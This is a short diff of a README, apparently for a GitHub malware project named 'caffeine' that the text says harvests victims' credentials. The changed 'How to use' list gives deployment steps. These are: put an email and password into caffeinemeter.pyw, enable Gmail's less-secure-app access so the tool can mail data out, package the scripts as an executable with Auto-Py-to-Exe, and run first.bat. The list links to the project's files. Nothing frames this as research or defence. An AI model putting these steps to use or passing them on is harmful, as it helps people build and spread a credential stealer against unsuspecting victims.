@@ -8,8 +8,16 @@ The malware can get but it’s not limited to: getting the credentials of a vict
 
 <h2>How to use:</h2>
 <ul>
-    <li><h4>Edit caffeinemeter.pyw with an email and password</h4></li>
-    <li><h4>Enable less secure apps to access Gmail</h4></li>
-    <li><h4>Convert pyw files to exe using Auto py to exe</h4></li>
-    <li><h4>Run first.bat</h3></li>
+    <li>
+        <h4>Edit <a href="https://github.com/firec0de/caffeine/blob/main/caffeineMeter.pyw" rel="noopener noreferrer" target="_blank">caffeinemeter.pyw </a>with an email and password</h4>
+    </li>
+    <li>
+        <h4>Enable <a href="https://myaccount.google.com/lesssecureapps" rel="noopener noreferrer" target="_blank">less secure</a> apps to access Gmail</h4>
+    </li>
+    <li>
+        <h4>Convert pyw files to exe using <a href="https://pypi.org/project/auto-py-to-exe/" rel="noopener noreferrer" target="_blank">Auto-Py-to-Exe</a></h4>
+    </li>
+    <li>
+        <h4>Run <a href="https://github.com/firec0de/caffeine/blob/main/first.bat" rel="noopener noreferrer" target="_blank">first.bat</a></h4>
+    </li>
 </ul>
